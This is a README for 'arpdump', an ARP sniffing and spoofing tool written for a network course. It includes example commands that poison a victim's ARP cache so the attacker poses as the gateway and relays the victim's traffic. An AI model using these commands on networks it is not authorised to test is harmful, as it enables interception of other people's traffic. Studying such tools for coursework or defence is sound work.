# arpdump

This tool was originally developed for a computer network course assignment

## Usage

```plain
arp sniffing and spoofing tool
Usage: ./arpdump [OPTIONS] [spoofed-ip]

Positionals:
  spoofed-ip TEXT Needs: --spoof         ip of host you want to spoof

Options:
  -h,--help                              Print this help message and exit
  -i,--interface TEXT REQUIRED           interface to use
  -s,--sniff Excludes: --spoof           sniff mode, default
  -c,--spoof Excludes: --sniff           spoof mode
  -m,--spoofed-mac TEXT Needs: --spoof   mac of host you want to spoof
  -n,--target-ip TEXT Needs: --spoof     tell other one which ip I have
  -e,--target-mac TEXT Needs: --spoof    tell other one which mac I have
  -t,--interval INT Needs: --spoof       inverval time (second) to send frame
  -l,--log TEXT                          specify log file
  -v,--verbose                           verbose mode
```

## Example

### sniff mode

just need to specify interface name

```bash
sudo ./arpdump -i wlo1
```

### spoof mode

```plain
example:

 victim ip:  192.168.137.179
victim mac:  a8:9c:ed:c1:e8:36

    our ip:  192.168.137.238
   our mac:  dc:71:96:22:a9:c5

gateway ip:  192.168.137.1
```

Suppose we want to trick the victim that our machine is gateway.

The commands below are equivalent.

```bash
# sending arp spoofing message and forward ethernet frame from victim to real gateway

# automatic find gateway ip and mac as target-ip/target-mac
sudo ./arpdump -i wlo1 --spoof 192.168.137.179
# specify spoofed-ip target-ip manually
sudo ./arpdump -i wlo1 --spoof 192.168.137.179 --target-ip 192.168.137.1 
# specify spoofed-ip target-ip target-mac manually
sudo ./arpdump -i wlo1 --spoof 192.168.137.179 --target-ip 192.168.137.1 --target-mac dc:71:96:22:a9:c5
# specify spoofed-ip -spoofed-mac target-ip target-mac manually
sudo ./arpdump -i wlo1 --spoof 192.168.137.179 --spoofed-mac a8:9c:ed:c1:e8:36 --target-ip 192.168.137.1 --target-mac dc:71:96:22:a9:c5
```
